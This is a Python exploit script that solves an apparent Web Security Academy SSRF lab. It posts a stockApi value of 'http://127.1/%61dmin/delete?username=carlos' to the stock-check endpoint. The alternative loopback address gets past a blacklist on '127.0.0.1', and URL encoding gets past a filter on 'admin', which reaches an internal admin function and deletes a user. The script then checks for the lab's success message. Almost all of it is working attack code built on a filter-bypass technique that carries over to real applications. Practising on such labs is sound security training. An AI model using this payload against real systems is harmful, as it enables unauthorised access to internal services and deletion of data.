import requests

# Configuration
BASE_URL = "https://0a8200f30324fd0f880a647e005e007b.web-security-academy.net/"

def execute_ssrf_exploit(url):
    """Exploits SSRF by bypassing blacklist filters using alternative IP representation and URL encoding."""
    session = requests.Session()
    stock_api_endpoint = f"{url}product/stock"
    
    # 1. Execution Phase
    # 127.1 bypasses the 127.0.0.1 string match.
    # %61 (single-encoded 'a') becomes %2561 (double-encoded 'a') on the wire via the requests library.
    print("[*] Transmitting obfuscated SSRF payload...")
    ssrf_payload = {
        "stockApi": "http://127.1/%61dmin/delete?username=carlos"
    }
    session.post(stock_api_endpoint, data=ssrf_payload)
    
    # 2. Verification Phase
    print("[*] Verifying execution status...")
    verification_response = session.get(url)
    
    if "Congratulations" in verification_response.text:
        print("[+] TARGET SECURED: SUCCESSFULLY DELETED USER 'CARLOS'")
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    execute_ssrf_exploit(BASE_URL)